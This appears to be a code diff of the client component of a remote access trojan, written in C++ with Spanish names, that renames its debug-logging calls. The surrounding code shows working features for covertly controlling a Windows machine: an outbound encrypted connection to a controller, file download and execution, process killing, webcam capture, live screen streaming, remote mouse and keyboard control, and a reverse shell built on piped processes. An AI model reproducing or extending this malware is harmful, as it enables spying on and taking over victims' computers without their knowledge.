@@ -52,7 +52,7 @@ void Cliente::DestroyClasses() {
         this->mod_Cam = nullptr;
     }
 
-    DebugPrint("[DC] Clases destruidas");
+    __DBG_("[DC] Clases destruidas");
 }
 
 Cliente::Cliente() {
@@ -80,7 +80,7 @@ bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
 
 	int iRes = getaddrinfo(cIP, cPuerto, &sAddress, &sServer);
 	if (iRes != 0) {
-        DebugPrint( "[X] getaddrinfo error" );
+        __DBG_( "[X] getaddrinfo error" );
 		return false;
 	}
 
@@ -92,7 +92,7 @@ bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
 
 		if (connect(this->sckSocket, sP->ai_addr, sP->ai_addrlen) == -1) {
 			//No se pudo conectar
-            DebugPrint("[X] No se pudo conectar");
+            __DBG_("[X] No se pudo conectar");
 			continue;
 		}
 		//exito
@@ -106,7 +106,7 @@ bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
 
     unsigned long int iBlock = 1;
     if (ioctlsocket(this->sckSocket, FIONBIO, &iBlock) != 0) {
-        DebugPrint( "[X] No se pudo hacer block" );
+        __DBG_( "[X] No se pudo hacer block" );
     }
 
     freeaddrinfo(sServer);
@@ -125,7 +125,7 @@ void Cliente::Add_to_Queue(const Paquete_Queue& paquete) {
 }
 
 void Cliente::Process_Queue() {
-    DebugPrint("[PQ] Inicio");
+    __DBG_("[PQ] Inicio");
     while (true) {
         
         if (!this->m_isRunning() || !this->m_isQueueRunning()) { break; }
@@ -151,7 +151,7 @@ void Cliente::Process_Queue() {
     }
     lock.unlock();
 
-    DebugPrint("[PQ] Done");
+    __DBG_("[PQ] Done");
 }
 
 //Procesar comando completo
@@ -160,7 +160,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     int iRecibido = paquete.cBuffer.size(); // esto -1 con datos binarios
     int iComando = paquete.uiTipoPaquete;
 
-    DebugPrint("[PQ] Procesando comando ", iComando);
+    _DBG_("[PQ] Procesando comando ", iComando);
 
     if (iComando == EnumComandos::FM_Descargar_Archivo_Recibir) {
         strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
@@ -173,10 +173,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 this->map_Archivos_Descarga[strIn[0]].ssOutfile.get()->write(cBytes, iBytesSize);
                 this->map_Archivos_Descarga[strIn[0]].uDescargado += iBytesSize;
             }else {
-                DebugPrint("[X] El archivo no esta abierto", GetLastError());
+                _DBG_("[X] El archivo no esta abierto", GetLastError());
             }
         } else {
-            DebugPrint("[X] Error parseando comando: " + std::string(paquete.cBuffer.data()));
+            __DBG_("[X] Error parseando comando: " + std::string(paquete.cBuffer.data()));
         }
         return;
     }
@@ -186,11 +186,9 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         if (this->map_Archivos_Descarga[strID].ssOutfile.get()->is_open()) {
             this->map_Archivos_Descarga[strID].ssOutfile.get()->close();
         }
-        DebugPrint("[!] Descarga completa");
-        if (this->map_Archivos_Descarga[strID].uDescargado == this->map_Archivos_Descarga[strID].uTamArchivo) {
-            DebugPrint("[!] ");
-        }else {
-            DebugPrint("[X] Error en la tranferencia");
+        __DBG_("[!] Descarga completa");
+        if (this->map_Archivos_Descarga[strID].uDescargado != this->map_Archivos_Descarga[strID].uTamArchivo) {
+            __DBG_("[X] Error en la tranferencia");
         }
         return;
     }
@@ -201,7 +199,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         //strIn[1] = tamano archivo
         //strIn[2] = id del archivo a recibir
         if (strIn.size() == 3) {
-            DebugPrint("[!] Descargando archivo en ruta " + strIn[0] + ". ID: " + strIn[2], atoi(strIn[1].c_str()));
+            _DBG_("[!] Descargando archivo en ruta " + strIn[0] + ". ID: " + strIn[2], atoi(strIn[1].c_str()));
             u64 uTamArchivo = StrToUint(strIn[1]);
             Archivo_Descarga nuevo_archivo;
             nuevo_archivo.ssOutfile = std::make_shared<std::ofstream>(strIn[0], std::ios::binary);
@@ -211,17 +209,17 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             if (nuevo_archivo.ssOutfile.get()->is_open()) {
                 this->Agregar_Archivo_Descarga(nuevo_archivo, strIn[2]);
             }else {
-                DebugPrint("[X] No se pudo abrir el archivo", GetLastError());
+                _DBG_("[X] No se pudo abrir el archivo", GetLastError());
             }
         }else {
-            DebugPrint("[X] Error parseando comando: " + std::string(paquete.cBuffer.data()));
+            __DBG_("[X] Error parseando comando: " + std::string(paquete.cBuffer.data()));
         }
         return;
     }
 
     //Sin uso por ahora
     if (iComando == EnumComandos::PING) {
-        DebugPrint("[!]PING");
+        __DBG_("[!]PING");
         //std::string strComand = std::to_string(EnumComandos::PONG);
         //strComand.append(1, CMD_DEL);
         //this->cSend(this->sckSocket, strComand.c_str(), strComand.size() + 1, 0, false, nullptr);
@@ -336,9 +334,9 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             bool isOK = Execute(strIn[0].c_str(), strIn[1] == "1" ? 1 : 0);
 
             if (isOK) {
-                DebugPrint("[!] " + strIn[0] + " - ejecutado");
+                __DBG_("[!] " + strIn[0] + " - ejecutado");
             }else {
-                DebugPrint("[X] Error ejecutando " + strIn[0]);
+                __DBG_("[X] Error ejecutando " + strIn[0]);
             }
         }
         return;
@@ -404,7 +402,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::PM_Kill) {
         int iPID = atoi(paquete.cBuffer.data());
         if (!EndProcess(iPID)) {
-            DebugPrint("[X] No se pudo terminar el PID ", iPID);
+            _DBG_("[X] No se pudo terminar el PID ", iPID);
         }
         return;
     }
@@ -447,7 +445,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         std::vector<std::string> cDev = this->mod_Cam->ListNameCaptureDevices();
         if (cDev.size() > 0) {
             for (std::string cDevice : cDev) {
-                DebugPrint(cDevice);
+                __DBG_(cDevice);
                 strPaquete += cDevice;
                 strPaquete.append(1, '|');
             }
@@ -468,7 +466,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             this->mod_Cam = new mod_Camera();
             this->mod_Cam->ListNameCaptureDevices();
             if (this->mod_Cam->vcCamObjs.size() <= 0) {
-                DebugPrint("[X] No se obtuvieron camaras");
+                __DBG_("[X] No se obtuvieron camaras");
                 delete this->mod_Cam;
                 this->mod_Cam = nullptr;
                 return;
@@ -490,7 +488,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         if (SUCCEEDED(hr)) {
             this->mod_Cam->vcCamObjs[iDeviceIndex].isActivated = true;
 
-            DebugPrint("[!] Camara iniciada correctamente");
+            __DBG_("[!] Camara iniciada correctamente");
 
             std::string strHeader = paquete.cBuffer.data();
             strHeader.append(1, CMD_DEL);
@@ -510,7 +508,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                         memcpy(cPacket.data() + iHeaderSize, cJPGBuffer.data(), iJPGBufferSize);
 
                         int iSent = this->cChunkSend(this->sckSocket, reinterpret_cast<const char*>(cPacket.data()), uiPacketSize, 0, true, nullptr, EnumComandos::CM_Single_Salida);
-                        DebugPrint("[!] bytes sent", iSent);
+                        _DBG_("[!] bytes sent", iSent);
 
                     }
                 }
@@ -605,7 +603,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                     delete this->reverseSHELL;
                     this->reverseSHELL = nullptr;
                 }
-                DebugPrint("[!] Shell terminada");
+                __DBG_("[!] Shell terminada");
             }
         }
         return;
@@ -640,7 +638,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             strPaquete.pop_back();
             this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::RD_Lista_Salida);
         }else {
-            DebugPrint("No se obtuvieron monitores ? ", GetLastError());
+            _DBG_("No se obtuvieron monitores ? ", GetLastError());
         }
         return;
     }
@@ -656,8 +654,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             if (strIn.size() == 2) {
                 ULONG iQuality = static_cast<ULONG>(atoi(strIn[0].c_str()));
                 int iMonitorIndex = atoi(strIn[1].c_str());
-                DebugPrint("Enviando captura de pantalla. Index:", iMonitorIndex);
-                DebugPrint("Calidad:", iQuality);
+                _DBG_("Enviando captura de pantalla. Index:", iMonitorIndex);
+                _DBG_("Calidad:", iQuality);
                 std::vector<char> vcDeskBuffer = this->mod_RemoteDesk->getFrameBytes(iQuality, iMonitorIndex);
                 int iBufferSize = vcDeskBuffer.size();
                 if (iBufferSize > 0) {
@@ -665,11 +663,11 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
                 }
                 else {
-                    DebugPrint("El buffer de remote_desk es 0");
+                    __DBG_("El buffer de remote_desk es 0");
                 }
             }
         }else {
-            DebugPrint("No se pudo reservar memoria para el modulo de escritorio remoto o ya esta enviando las imagenes");
+            __DBG_("No se pudo reservar memoria para el modulo de escritorio remoto o ya esta enviando las imagenes");
         }
         return;
     }
@@ -684,8 +682,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             if (strIn.size() == 2) {
                 int iQuality = atoi(strIn[0].c_str());
                 int iMonitorIndex = atoi(strIn[1].c_str());
-                DebugPrint("Empezando live de pantalla. Index:", iMonitorIndex);
-                DebugPrint("Calidad:", iQuality);
+                _DBG_("Empezando live de pantalla. Index:", iMonitorIndex);
+                _DBG_("Calidad:", iQuality);
 
                 this->mod_RemoteDesk->SpawnThread(iQuality, iMonitorIndex);
             }
@@ -696,7 +694,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Detener live
     if (iComando == EnumComandos::RD_Stop) {
         if (!this->mod_RemoteDesk) {
-            DebugPrint("No se ha iniciado el objeto de remote_Desktop");
+            __DBG_("No se ha iniciado el objeto de remote_Desktop");
             return;
         }
         this->mod_RemoteDesk->DetenerLive();
@@ -709,7 +707,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             ULONG uQuality = static_cast<ULONG>(atoi(paquete.cBuffer.data()));
             this->mod_RemoteDesk->m_UpdateQuality(uQuality);
         }else {
-            DebugPrint("[RD]No se ha creado el objeto");
+            __DBG_("[RD]No se ha creado el objeto");
         }
         return;
     }
@@ -721,7 +719,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             this->mod_RemoteDesk->m_UpdateVmouse(isVmouseOn);
         }
         else {
-            DebugPrint("[RD]No se ha creado el objeto");
+            __DBG_("[RD]No se ha creado el objeto");
         }
         return;
     }
@@ -737,11 +735,11 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 int mouse_action  = atoi(strIn[3].c_str());
                 this->mod_RemoteDesk->m_RemoteMouse(x, y, monitor_index, mouse_action);
             }else {
-                DebugPrint("[RD] No se pudo parsear el paquete remote_click");
+                __DBG_("[RD] No se pudo parsear el paquete remote_click");
             }
         }
         else {
-            DebugPrint("[RD]No se ha creado el objeto");
+            __DBG_("[RD]No se ha creado el objeto");
         }
         return;
     }
@@ -756,10 +754,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 bool isDown = strIn[1][0] == '0' ? true : false;
                 this->mod_RemoteDesk->m_RemoteTeclado(key, isDown);
             }else {
-                DebugPrint("[RD] No se pudo parsear el paquete remote_teclado");
+                __DBG_("[RD] No se pudo parsear el paquete remote_teclado");
             }
         }else {
-            DebugPrint("[RD]No se ha creado el objeto");
+            __DBG_("[RD]No se ha creado el objeto");
         }
         return;
     }
@@ -773,7 +771,7 @@ void Cliente::Procesar_Paquete(const Paquete& paquete) {
     memcpy(acumulador.data() + oldsize, paquete.cBuffer.data(), paquete.uiTamBuffer);
 
     if (paquete.uiIsUltimo == 1) {
-        DebugPrint("[PP] Paquete completo ", paquete.uiTipoPaquete);
+        _DBG_("[PP] Paquete completo ", paquete.uiTipoPaquete);
         //Agregar al queue de comandos
         acumulador.push_back('\0'); //Borrar este byte al trabajar con datos binarios
         Paquete_Queue nNuevo;
@@ -790,7 +788,6 @@ void Cliente::Procesar_Paquete(const Paquete& paquete) {
 void Cliente::MainLoop() {
     this->Spawn_QueueMan(); //spawn thread que lee el queue de los comandos
     DWORD error_code = 0;
-    const int iBuffSize = PAQUETE_BUFFER_SIZE + 1024;
     int ultimo_paquete = 0;
     std::vector<char> cBuffer;
     
@@ -810,10 +807,10 @@ void Cliente::MainLoop() {
                     }
                 }
             }
-            DebugPrint("[MAIN-LOOP] No se pudo recibir nada");
-            DebugPrint("Recibido:", iRecibido);
-            DebugPrint("Error:", error_code);
-            DebugPrint("Ultimo paquete:", ultimo_paquete);
+            __DBG_("[MAIN-LOOP] No se pudo recibir nada");
+            _DBG_("Recibido:", iRecibido);
+            _DBG_("Error:", error_code);
+            _DBG_("Ultimo paquete:", ultimo_paquete);
 
             break;
         }
@@ -825,7 +822,7 @@ void Cliente::MainLoop() {
                 ultimo_paquete = nNuevo.uiTipoPaquete;
                 this->Procesar_Paquete(nNuevo);
             }else {
-                DebugPrint("Error deserializando el paquete. Recibido:", iRecibido);
+                _DBG_("Error deserializando el paquete. Recibido:", iRecibido);
             }
         }else {
             std::this_thread::sleep_for(std::chrono::milliseconds(100));
@@ -854,7 +851,7 @@ void Cliente::iniPacket() {
     
     int iEnviado = this->cChunkSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, true, nullptr, EnumComandos::INIT_PACKET);
     
-    DebugPrint("[INIT]Enviados ", iEnviado);
+    _DBG_("[INIT]Enviados ", iEnviado);
 }
 
 int Cliente::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code, int iTipoPaquete) {
@@ -886,7 +883,7 @@ int Cliente::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFla
             nPaquete.uiIsUltimo = iDataSize == 0 ? 1 : 0;
             nPaquete.cBuffer.resize(iChunkSize);
             if (nPaquete.cBuffer.size() < iChunkSize) {
-                DebugPrint("[CHUNK] No se pudo reservar memoria", GetLastError());
+                _DBG_("[CHUNK] No se pudo reservar memoria", GetLastError());
                 break;
             }
 
@@ -939,7 +936,7 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize);
     iDataSize = cData.size();
     if (iDataSize == 0) {
-        DebugPrint("[cSend] Error cifrando los datos", GetLastError());
+        _DBG_("[cSend] Error cifrando los datos", GetLastError());
         return -1;
     }
 
@@ -956,7 +953,7 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     if (isBlock) {
         //Hacer el socket block
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
-            DebugPrint("[cSend] No se pudo hacer block", GetLastError());
+            _DBG_("[cSend] No se pudo hacer block", GetLastError());
         }
     }
     
@@ -970,7 +967,7 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
         if (!this->BLOCK_MODE) {
             iBlock = 1;
             if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
-                DebugPrint("No se pudo restaurar el block_mode del socket");
+                __DBG_("No se pudo restaurar el block_mode del socket");
             }
         }
     }
@@ -1009,7 +1006,7 @@ int Cliente::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool
     if (isBlock) {
         //Hacer el socket block
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
-            DebugPrint("No se pudo hacer block");
+            __DBG_("No se pudo hacer block");
         }
     }
         
@@ -1023,7 +1020,7 @@ int Cliente::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool
             //Asegurarse de leer todos los bytes
             iRecibido = this->recv_all(pSocket, cRecvBuffer.data(), iPaquetesize, pFlags);
             if (iRecibido < 0) {
-                DebugPrint("No se pudo leer nada recv_all.", iRecibido);
+                _DBG_("No se pudo leer nada recv_all.", iRecibido);
                 bErrorFlag = true;
             }
         }
@@ -1040,7 +1037,7 @@ int Cliente::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool
     if (isBlock && !this->BLOCK_MODE) {
         iBlock = 1;
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
-            DebugPrint("No se pudo restaurar el block_mode en el socket");
+            __DBG_("No se pudo restaurar el block_mode en el socket");
         }
     }
 
@@ -1050,7 +1047,7 @@ int Cliente::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool
     ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cRecvBuffer.data()), iRecibido);
     iRecibido = bOut.size();
     if (iRecibido == 0) {
-        DebugPrint("[cRecv] No se pudo desencriptar el buffer", GetLastError());
+        _DBG_("[cRecv] No se pudo desencriptar el buffer", GetLastError());
         return 0;
     }
 
@@ -1058,7 +1055,7 @@ int Cliente::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool
     if (pBuffer.size() == iRecibido) {
         memcpy(pBuffer.data(), bOut.data(), iRecibido);
     }else {
-        DebugPrint("[cRecv] No se pudo reservar memoria para el buffer de salida", GetLastError());
+        _DBG_("[cRecv] No se pudo reservar memoria para el buffer de salida", GetLastError());
         return 0;
     }
     return iRecibido;
@@ -1086,7 +1083,7 @@ bool Cliente::m_DeserializarPaquete(const char* cBuffer, Paquete& paquete, int b
     if (paquete.cBuffer.size() == paquete.uiTamBuffer) {
         memcpy(paquete.cBuffer.data(), cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.uiTamBuffer);
     }else {
-        DebugPrint("[DESER] No se pudo reservar memoria", GetLastError());
+        _DBG_("[DESER] No se pudo reservar memoria", GetLastError());
         return false;
     }
     return true;
@@ -1102,7 +1099,7 @@ ByteArray Cliente::bEnc(const unsigned char* pInput, size_t pLen) {
     ByteArray bOutput;
     ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
     if (enc_len <= 0) {
-        DebugPrint("Error encriptando el buffer");
+        __DBG_("Error encriptando el buffer");
     }
     return bOutput;
 }
@@ -1111,7 +1108,7 @@ ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
     ByteArray bOutput;
     ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
     if (dec_len <= 0) {
-        DebugPrint("Error desencriptando");
+        __DBG_("Error desencriptando");
     }
     return bOutput;
 }
@@ -1154,7 +1151,7 @@ std::string Cliente::ObtenerDown() {
 //Reverse shell
 
 bool ReverseShell::SpawnShell(const char* pstrComando) {
-    DebugPrint("Lanzando " + std::string(pstrComando));
+    __DBG_("Lanzando " + std::string(pstrComando));
 
     this->stdinRd = this->stdinWr = this->stdoutRd = this->stdoutWr = nullptr;
     SECURITY_ATTRIBUTES sa;
@@ -1162,7 +1159,7 @@ bool ReverseShell::SpawnShell(const char* pstrComando) {
     sa.lpSecurityDescriptor = nullptr;
     sa.bInheritHandle = true;
     if (!CreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !CreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
-        DebugPrint("Error creando tuberias");
+        __DBG_("Error creando tuberias");
         return false;
     }
     STARTUPINFO si;
@@ -1174,13 +1171,13 @@ bool ReverseShell::SpawnShell(const char* pstrComando) {
     si.hStdInput = this->stdinRd;
 
     if (CreateProcess(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
-        DebugPrint("No se pudo spawnear la shell");
+        __DBG_("No se pudo spawnear la shell");
         return false;
     }
     
     //La shell esta corriendo
     this->isRunning = true;
-    DebugPrint("Running!");
+    __DBG_("Running!");
     
     this->tRead = std::thread(&ReverseShell::thLeerShell, this, stdoutRd);
     
@@ -1258,7 +1255,7 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             break;
         }
     }
-    DebugPrint("[!]thLeerShell finalizada");
+    __DBG_("[!]thLeerShell finalizada");
 }
 
 void ReverseShell::thEscribirShell(std::string pStrInput) {
@@ -1271,7 +1268,7 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
     DWORD dBytesWrited = 0;
     //stdinWr tuberia de entrada
     if (!WriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
-        DebugPrint("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
+        __DBG_("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
         std::unique_lock<std::mutex> lock(this->mutex_shell);
         this->isRunning = false;
         lock.unlock();
